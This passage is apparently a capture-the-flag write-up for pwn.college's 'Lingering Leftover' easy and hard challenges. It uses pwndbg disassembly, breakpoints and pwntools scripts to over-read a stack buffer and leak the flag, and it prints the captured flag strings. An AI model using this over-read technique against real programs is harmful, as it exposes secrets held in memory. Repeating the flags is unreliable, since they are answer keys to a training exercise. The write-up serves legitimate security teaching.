+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x57856777cb96 challenge+1429
+   1   0x57856777ce98 main+223
+   2   0x7d6e79d90083 __libc_start_main+243
+   3   0x57856777b20e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [x] Location of buffer: `0x7ffe5dbd2da0`
+- [x] Location of the flag in the stack: `0x7ffe5dbd2e96`
+
+If we send our payload right upto the flag's address in the stack, we can cause a buffer over-read.
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+p = process('/challenge/lingering-leftover-easy')
+
+# Initialize values
+buffer_addr = 0x7ffe5dbd2da0
+flag_addr = 0x7ffe5dbd2e96
+
+# Calculate offset & payload_size
+offset = flag_addr - buffer_addr
+payload_size = offset
+
+# Build payload
+payload = b"A" * offset
+
+# Send payload size
+p.recvuntil(b'Payload size: ')
+p.sendline(str(payload_size).encode())
+
+# Send payload
+p.recvuntil(b'bytes)!')
+p.send(payload)
+
+p.interactive() 
+```
+
+```
+hacker@program-security~lingering-leftover-easy:/$ python ~/script.py 
+[+] Starting local process '/challenge/lingering-leftover-easy': pid 28116
+[*] Switching to interactive mode
+
+[*] Process '/challenge/lingering-leftover-easy' stopped with exit code 0 (pid 28116)
+You sent 246 bytes!
+Let's see what happened with the stack:
+
+# ---- snip ----
+
+The program's memory status:
+- the input buffer starts at 0x7ffedd8fedd0
+- the saved frame pointer (of main) is at 0x7ffedd8fefd0
+- the saved return address (previously to main) is at 0x7ffedd8fefd8
+- the saved return address is now pointing to 0x61fe341e4e98.
+- the canary is stored at 0x7ffedd8fefc8.
+- the canary value is now 0xf8b9d7df959efa00.
+- the address of win_authed() is 0x61fe341e4452.
+
+If you have managed to overwrite the return address with the correct value,
+challenge() will jump straight to win_authed() when it returns.
+Let's try it now!
+
+You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApwn.college{4mozEL4j0Z5S8ik08BznrRaq9fW.01MxMDL4ITM0EzW}
+
+Goodbye!
+### Goodbye!
+[*] Got EOF while reading in interactive
+$  
+```
+
+&nbsp;
+
+## Lingering Leftover (Hard)
+
+```
+hacker@program-security~lingering-leftover-hard:/$ /challenge/lingering-leftover-hard 
+###
+### Welcome to /challenge/lingering-leftover-hard!
+###
+
+Payload size: 2
+Send your payload (up to 2 bytes)!
+aa
+You said: aa
+Goodbye!
+### Goodbye!
+```
+
+Requirements:
+
+- [ ] Location of buffer
+- [ ] Location of the flag in the stack
+
+### Binary Analysis
+
+```
+pwndbg> info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000001000  _init
+0x0000000000001100  __cxa_finalize@plt
+0x0000000000001110  putchar@plt
+0x0000000000001120  __errno_location@plt
+0x0000000000001130  puts@plt
+0x0000000000001140  write@plt
+0x0000000000001150  __stack_chk_fail@plt
+0x0000000000001160  printf@plt
+0x0000000000001170  geteuid@plt
+0x0000000000001180  read@plt
+0x0000000000001190  setvbuf@plt
+0x00000000000011a0  open@plt
+0x00000000000011b0  __isoc99_scanf@plt
+0x00000000000011c0  exit@plt
+0x00000000000011d0  strerror@plt
+0x00000000000011e0  _start
+0x0000000000001210  deregister_tm_clones
+0x0000000000001240  register_tm_clones
+0x0000000000001280  __do_global_dtors_aux
+0x00000000000012c0  frame_dummy
+0x00000000000012c9  bin_padding
+0x0000000000001ddf  win_authed
+0x0000000000001efc  verify_flag
+0x0000000000001f63  challenge
+0x000000000000208d  main
+0x00000000000021a0  __libc_csu_init
+0x0000000000002210  __libc_csu_fini
+0x0000000000002218  _fini
+```
+
+#### `verify_flag()`
+
+```
+pwndbg> disassemble verify_flag 
+Dump of assembler code for function verify_flag:
+   0x0000000000001efc <+0>:     endbr64
+   0x0000000000001f00 <+4>:     push   rbp
+   0x0000000000001f01 <+5>:     mov    rbp,rsp
+   0x0000000000001f04 <+8>:     sub    rsp,0x170
+   0x0000000000001f0b <+15>:    mov    rax,QWORD PTR fs:0x28
+   0x0000000000001f14 <+24>:    mov    QWORD PTR [rbp-0x8],rax
+   0x0000000000001f18 <+28>:    xor    eax,eax
+   0x0000000000001f1a <+30>:    mov    esi,0x0
+   0x0000000000001f1f <+35>:    lea    rdi,[rip+0x10fe]        # 0x3024
+   0x0000000000001f26 <+42>:    mov    eax,0x0
+   0x0000000000001f2b <+47>:    call   0x11a0 <open@plt>
+   0x0000000000001f30 <+52>:    mov    ecx,eax
+   0x0000000000001f32 <+54>:    lea    rax,[rbp-0x170]
+   0x0000000000001f39 <+61>:    add    rax,0x5a
+   0x0000000000001f3d <+65>:    mov    edx,0x100
+   0x0000000000001f42 <+70>:    mov    rsi,rax
+   0x0000000000001f45 <+73>:    mov    edi,ecx
+   0x0000000000001f47 <+75>:    call   0x1180 <read@plt>
+   0x0000000000001f4c <+80>:    nop
+   0x0000000000001f4d <+81>:    mov    rdx,QWORD PTR [rbp-0x8]
+   0x0000000000001f51 <+85>:    xor    rdx,QWORD PTR fs:0x28
+   0x0000000000001f5a <+94>:    je     0x1f61 <verify_flag+101>
+   0x0000000000001f5c <+96>:    call   0x1150 <__stack_chk_fail@plt>
+   0x0000000000001f61 <+101>:   leave
+   0x0000000000001f62 <+102>:   ret
+End of assembler dump.
+```
+
+Let's set a breakpoint at `verify_flag+75`.
+
+```
+pwndbg> break *(verify_flag+75)
+Breakpoint 1 at 0x1f47
+```
+
+### `challenge()`
+
+```
+pwndbg> disassemble challenge 
+Dump of assembler code for function challenge:
+   0x0000000000001f63 <+0>:     endbr64
+   0x0000000000001f67 <+4>:     push   rbp
+   0x0000000000001f68 <+5>:     mov    rbp,rsp
+   0x0000000000001f6b <+8>:     sub    rsp,0x1e0
+   0x0000000000001f72 <+15>:    mov    DWORD PTR [rbp-0x1c4],edi
+   0x0000000000001f78 <+21>:    mov    QWORD PTR [rbp-0x1d0],rsi
+   0x0000000000001f7f <+28>:    mov    QWORD PTR [rbp-0x1d8],rdx
+   0x0000000000001f86 <+35>:    mov    rax,QWORD PTR fs:0x28
+   0x0000000000001f8f <+44>:    mov    QWORD PTR [rbp-0x8],rax
+   0x0000000000001f93 <+48>:    xor    eax,eax
+   0x0000000000001f95 <+50>:    lea    rax,[rbp-0x1a0]
+   0x0000000000001f9c <+57>:    mov    QWORD PTR [rbp-0x1a8],rax
+   0x0000000000001fa3 <+64>:    mov    QWORD PTR [rbp-0x1b0],0x0
+   0x0000000000001fae <+75>:    lea    rdi,[rip+0x1157]        # 0x310c
+   0x0000000000001fb5 <+82>:    mov    eax,0x0
+   0x0000000000001fba <+87>:    call   0x1160 <printf@plt>
+   0x0000000000001fbf <+92>:    lea    rax,[rbp-0x1b0]
+   0x0000000000001fc6 <+99>:    mov    rsi,rax
+   0x0000000000001fc9 <+102>:   lea    rdi,[rip+0x114b]        # 0x311b
+   0x0000000000001fd0 <+109>:   mov    eax,0x0
+   0x0000000000001fd5 <+114>:   call   0x11b0 <__isoc99_scanf@plt>
+   0x0000000000001fda <+119>:   mov    rax,QWORD PTR [rbp-0x1b0]
+   0x0000000000001fe1 <+126>:   mov    rsi,rax
+   0x0000000000001fe4 <+129>:   lea    rdi,[rip+0x1135]        # 0x3120
+   0x0000000000001feb <+136>:   mov    eax,0x0
+   0x0000000000001ff0 <+141>:   call   0x1160 <printf@plt>
+   0x0000000000001ff5 <+146>:   mov    rdx,QWORD PTR [rbp-0x1b0]
+   0x0000000000001ffc <+153>:   mov    rax,QWORD PTR [rbp-0x1a8]
+   0x0000000000002003 <+160>:   mov    rsi,rax
+   0x0000000000002006 <+163>:   mov    edi,0x0
+   0x000000000000200b <+168>:   call   0x1180 <read@plt>
+   0x0000000000002010 <+173>:   mov    DWORD PTR [rbp-0x1b4],eax
+   0x0000000000002016 <+179>:   cmp    DWORD PTR [rbp-0x1b4],0x0
+   0x000000000000201d <+186>:   jns    0x204b <challenge+232>
+   0x000000000000201f <+188>:   call   0x1120 <__errno_location@plt>
+   0x0000000000002024 <+193>:   mov    eax,DWORD PTR [rax]
+   0x0000000000002026 <+195>:   mov    edi,eax
+   0x0000000000002028 <+197>:   call   0x11d0 <strerror@plt>
+   0x000000000000202d <+202>:   mov    rsi,rax
+   0x0000000000002030 <+205>:   lea    rdi,[rip+0x1111]        # 0x3148
+   0x0000000000002037 <+212>:   mov    eax,0x0
+   0x000000000000203c <+217>:   call   0x1160 <printf@plt>
+   0x0000000000002041 <+222>:   mov    edi,0x1
+   0x0000000000002046 <+227>:   call   0x11c0 <exit@plt>
+   0x000000000000204b <+232>:   mov    rax,QWORD PTR [rbp-0x1a8]
+   0x0000000000002052 <+239>:   mov    rsi,rax
+   0x0000000000002055 <+242>:   lea    rdi,[rip+0x1110]        # 0x316c
+   0x000000000000205c <+249>:   mov    eax,0x0
+   0x0000000000002061 <+254>:   call   0x1160 <printf@plt>
+   0x0000000000002066 <+259>:   lea    rdi,[rip+0x1111]        # 0x317e
+   0x000000000000206d <+266>:   call   0x1130 <puts@plt>
+   0x0000000000002072 <+271>:   mov    eax,0x0
+   0x0000000000002077 <+276>:   mov    rcx,QWORD PTR [rbp-0x8]
+   0x000000000000207b <+280>:   xor    rcx,QWORD PTR fs:0x28
+   0x0000000000002084 <+289>:   je     0x208b <challenge+296>
+   0x0000000000002086 <+291>:   call   0x1150 <__stack_chk_fail@plt>
+   0x000000000000208b <+296>:   leave
+   0x000000000000208c <+297>:   ret
+End of assembler dump.
+```
+
+Another breakpoint at `challenge+168` where the call to `read@plt` is made.
+
+```
+pwndbg> break *(challenge+168)
+Breakpoint 2 at 0x200b
+```
+
+Now, we can run the program and get the values.
+
+```
+pwndbg> run
+Starting program: /challenge/lingering-leftover-hard 
+###
+### Welcome to /challenge/lingering-leftover-hard!
+###
+
+
+Breakpoint 1, 0x00005721cd032f47 in verify_flag ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────────────────────────
+ RAX  0x7fff21143e7a ◂— 0x3d3e622feef
+ RBX  0x5721cd0331a0 (__libc_csu_init) ◂— endbr64 
+ RCX  0xffffffff
+ RDX  0x100
+ RDI  0xffffffff
+ RSI  0x7fff21143e7a ◂— 0x3d3e622feef
+ R8   0xa
+ R9   0x33
+ R10  0
+ R11  0x246
+ R12  0x5721cd0321e0 (_start) ◂— endbr64 
+ R13  0x7fff211450c0 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7fff21143f90 —▸ 0x7fff21144fd0 ◂— 0
+ RSP  0x7fff21143e20 ◂— 0
+ RIP  0x5721cd032f47 (verify_flag+75) ◂— call read@plt
+────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x5721cd032f47 <verify_flag+75>     call   read@plt                    <read@plt>
+        fd: 0xffffffff
+        buf: 0x7fff21143e7a ◂— 0x3d3e622feef
+        nbytes: 0x100
+ 
+   0x5721cd032f4c <verify_flag+80>     nop    
+   0x5721cd032f4d <verify_flag+81>     mov    rdx, qword ptr [rbp - 8]
+   0x5721cd032f51 <verify_flag+85>     xor    rdx, qword ptr fs:[0x28]
+   0x5721cd032f5a <verify_flag+94>     je     verify_flag+101             <verify_flag+101>
+ 
+   0x5721cd032f5c <verify_flag+96>     call   __stack_chk_fail@plt        <__stack_chk_fail@plt>
+ 
+   0x5721cd032f61 <verify_flag+101>    leave  
+   0x5721cd032f62 <verify_flag+102>    ret    
+ 
+   0x5721cd032f63 <challenge>          endbr64 
+   0x5721cd032f67 <challenge+4>        push   rbp
+   0x5721cd032f68 <challenge+5>        mov    rbp, rsp
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fff21143e20 ◂— 0
+... ↓        7 skipped
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x5721cd032f47 verify_flag+75
+   1   0x5721cd03314e main+193
+   2   0x73ddde212083 __libc_start_main+243
+   3   0x5721cd03220e _start+46
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [ ] Location of buffer
+- [x] Location of the flag in the stack: `0x7fff21143e7a`
+
+```
+pwndbg> c
+Continuing.
+Payload size: 2
+Send your payload (up to 2 bytes)!
+
+Breakpoint 2, 0x00005721cd03300b in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────────────────────────
+*RAX  0x7fff21143df0 ◂— 0
+ RBX  0x5721cd0331a0 (__libc_csu_init) ◂— endbr64 
+*RCX  0
+*RDX  2
+*RDI  0
+*RSI  0x7fff21143df0 ◂— 0
+*R8   0x23
+*R9   0x23
+*R10  0x5721cd03413c ◂— ' bytes)!\n'
+ R11  0x246
+ R12  0x5721cd0321e0 (_start) ◂— endbr64 
+ R13  0x7fff211450c0 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7fff21143f90 —▸ 0x7fff21144fd0 ◂— 0
+*RSP  0x7fff21143db0 ◂— 0
+*RIP  0x5721cd03300b (challenge+168) ◂— call read@plt
+────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x5721cd03300b <challenge+168>    call   read@plt                    <read@plt>
+        fd: 0 (/dev/pts/0)
+        buf: 0x7fff21143df0 ◂— 0
+        nbytes: 2
+ 
+   0x5721cd033010 <challenge+173>    mov    dword ptr [rbp - 0x1b4], eax
+   0x5721cd033016 <challenge+179>    cmp    dword ptr [rbp - 0x1b4], 0
+   0x5721cd03301d <challenge+186>    jns    challenge+232               <challenge+232>
+ 
+   0x5721cd03301f <challenge+188>    call   __errno_location@plt        <__errno_location@plt>
+ 
+   0x5721cd033024 <challenge+193>    mov    eax, dword ptr [rax]
+   0x5721cd033026 <challenge+195>    mov    edi, eax
+   0x5721cd033028 <challenge+197>    call   strerror@plt                <strerror@plt>
+ 
+   0x5721cd03302d <challenge+202>    mov    rsi, rax
+   0x5721cd033030 <challenge+205>    lea    rdi, [rip + 0x1111]     RDI => 0x5721cd034148 ◂— 'ERROR: Failed to read input -- %s!\n'
+   0x5721cd033037 <challenge+212>    mov    eax, 0                  EAX => 0
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fff21143db0 ◂— 0
+01:0008│-1d8 0x7fff21143db8 —▸ 0x7fff211450d8 —▸ 0x7fff2114568e ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-1d0 0x7fff21143dc0 —▸ 0x7fff211450c8 —▸ 0x7fff2114566b ◂— '/challenge/lingering-leftover-hard'
+03:0018│-1c8 0x7fff21143dc8 ◂— 0x1feef1d00
+04:0020│-1c0 0x7fff21143dd0 ◂— 0
+05:0028│-1b8 0x7fff21143dd8 ◂— 0
+06:0030│-1b0 0x7fff21143de0 ◂— 2
+07:0038│-1a8 0x7fff21143de8 —▸ 0x7fff21143df0 ◂— 0
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x5721cd03300b challenge+168
+   1   0x5721cd03316c main+223
+   2   0x73ddde212083 __libc_start_main+243
+   3   0x5721cd03220e _start+46
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [x] Location of buffer: `0x7fff21143df0`
+- [x] Location of the flag in the stack: `0x7fff21143e7a`
+
+We can now perform a buffer over-read.
+
+### Exploit 
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+p = process('/challenge/lingering-leftover-hard')
+
+# Initialize values
+buffer_addr = 0x7fff21143df0
+flag_addr = 0x7fff21143e7a
+
+# Calculate offset & payload_size
+offset = flag_addr - buffer_addr
+payload_size = offset
+
+# Build payload
+payload = b"A" * offset
+
+# Send payload size
+p.recvuntil(b'Payload size: ')
+p.sendline(str(payload_size).encode())
+
+# Send payload
+p.recvuntil(b'bytes)!')
+p.send(payload)
+
+p.interactive() 
+```
+
+```
+hacker@program-security~lingering-leftover-hard:/$ python ~/script.py 
+[+] Starting local process '/challenge/lingering-leftover-hard': pid 6644
+[*] Switching to interactive mode
+
+[*] Process '/challenge/lingering-leftover-hard' stopped with exit code 0 (pid 6644)
+You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApwn.college{g3Gr3RrOLzEbVs6eMjPKXRf_tp8.0FNxMDL4ITM0EzW}
+\xa8\xfd\x7f
+Goodbye!
+### Goodbye!
+[*] Got EOF while reading in interactive
+$ 
 ```
